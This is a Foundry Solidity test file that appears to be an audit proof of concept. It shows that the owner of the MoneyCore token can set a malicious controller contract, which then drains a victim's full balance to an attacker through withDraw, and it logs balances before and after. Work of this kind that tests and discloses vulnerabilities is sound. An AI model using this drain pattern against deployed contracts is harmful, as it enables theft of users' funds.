// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MoneyCore.sol";

contract OTUT_Test is Test {
    MoneyCore token;
    address owner = address(0x1);
    address victim = address(0x2);
    address attacker = address(0x3);
    uint256 initialSupply = 1000 ether;

    function setUp() public {
        // Deploy token and prepare initial state
        vm.prank(owner);
        token = new MoneyCore(initialSupply, owner);
        
        // Distribute tokens
        vm.prank(owner);
        token.transfer(victim, 100 ether);
    }

    function test_owner_transfer_user_tokens() public {
        // Set victim's address as target account (requires victim to be an EOA)
        vm.prank(owner);
        token.setAccount(victim);

        // Attacker deploys a malicious controller contract
        vm.prank(attacker);
        MaliciousController maliciousController = new MaliciousController();

        // Owner sets malicious controller as active controller
        vm.prank(owner);
        token.setController(address(maliciousController));
        
        // -- Verification Starts Here --
        // Step 1: Pre-attack state
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        console.log("Victim Balance Before Attack:", victimBalanceBefore);
        console.log("Attacker Balance Before Attack:", attackerBalanceBefore);
        
        // Step 2: Execute the critical attack operation
        console.log("--- Trigger Attack: maliciousController.attack ---");
        vm.prank(attacker);
        maliciousController.attack(address(token), attacker, victimBalanceBefore);
        
        // Step 3: Post-attack state
        console.log("--- AFTER-Trigger Balances ---");
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        console.log("Victim Balance After Attack:", victimBalanceAfter);
        console.log("Attacker Balance After Attack:", attackerBalanceAfter);
        
        // Step 4: Compute changes and verify vulnerability
        console.log("--- Balance Changes ---");
        uint256 victimLoss = victimBalanceBefore - victimBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Victim Loss Amount:", victimLoss);
        console.log("Attacker Gain Amount:", attackerGain);
        
        // Step 5: Final vulnerability determination
        if (victimLoss == victimBalanceBefore && attackerGain == victimBalanceBefore) {
            console.log("Vulnerability Exists: Owner-abused controller allowed attacker to steal victim's funds");
        } else {
            console.log("Vulnerability not Exist: No funds transfer to attacker observed");
        }
    }
}

contract MaliciousController {
    function attack(address tokenAddr, address recipient, uint256 amount) external {
        MoneyCore(tokenAddr).withDraw(recipient, amount);
    }
}